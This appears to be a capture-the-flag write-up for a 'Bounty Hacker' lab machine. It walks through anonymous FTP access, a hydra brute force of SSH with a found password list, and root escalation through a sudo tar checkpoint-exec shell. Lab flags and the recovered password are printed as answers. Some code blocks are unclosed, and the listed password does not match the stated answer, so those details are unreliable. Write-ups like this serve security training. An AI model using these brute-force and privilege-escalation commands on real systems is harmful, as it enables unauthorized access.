We can now run a `nmap` scan on the machine.

Let's login through FTP anonymously.
```

ftp> 
```
Let's look at the contents of the directory
```
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
```
We can download these files to our machine using the `get` command.
```
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 EPRT command successful. Consider using EPSV.

Let's read the `task.txt` file.
```
$ cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin

### What service can you bruteforce with the text file found?
Since we saw that FTP, SSH and HTTP were the services running on the machine it is safe to saw that we can brute force SSH
### Answer
```
SSH
```

&nbsp;

### What is the users password?
Let's take a look at the `locks.txt` file
```
$ cat locks.txt 
rEddrAGON
ReDdr4g0nSynd!cat3

Seems to be a bunch of passwords.

We can brute force SSH using the `hydra` utility.
```
$ hydra -l lin -P locks.txt 10.10.245.97 ssh

So the password for the `lin` user is `RedDr4gonSynd1cat3`.
### Answer
```
RedDr4gonSynd1cat3
```

### user.txt
Let's login using the credentials we have.
```
$ ssh lin@10.10.245.97  
The authenticity of host '10.10.245.97 (10.10.245.97)' can't be established.

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

After lookin around we can see a `user.txt` file. Let's `cat` that file.
```
lin@bountyhacker:~/Desktop$ cat user.txt 
THM{CR1M3_SyNd1C4T3}
```
###  Answer
```
THM{CR1M3_SyNd1C4T3}
```

### root.txt
We can list out the files that the `lin`  user is able to run using the following command:
```
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```
We can now use GTFOBins to escalate our privilege.

We will use the `Sudo` exploit.
```
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# 
```
We now have root privilege and can cat the `root.txt` file. 
```
# cat root.txt  
THM{80UN7Y_h4cK3r}
```
### Answer
```
THM{80UN7Y_h4cK3r}
```
